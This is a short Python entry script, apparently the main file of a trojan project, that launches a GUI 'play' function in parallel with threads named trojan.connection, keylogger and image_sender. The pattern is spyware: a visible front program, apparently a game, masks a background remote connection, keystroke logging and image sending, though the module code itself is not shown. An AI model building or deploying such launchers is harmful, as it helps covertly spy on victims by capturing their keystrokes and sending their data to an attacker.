import  threading
import GUI
import trojan
from logger import keylogger
from image_client import image_sender


if __name__ == '__main__':
    t1 = threading.Thread(target=GUI.play)
    t2 = threading.Thread(target=trojan.connection)
    t3 = threading.Thread(target=keylogger)
    t4 = threading.Thread(target=image_sender)

    t1.start()
    t2.start()
    t3.start()
    t4.start()

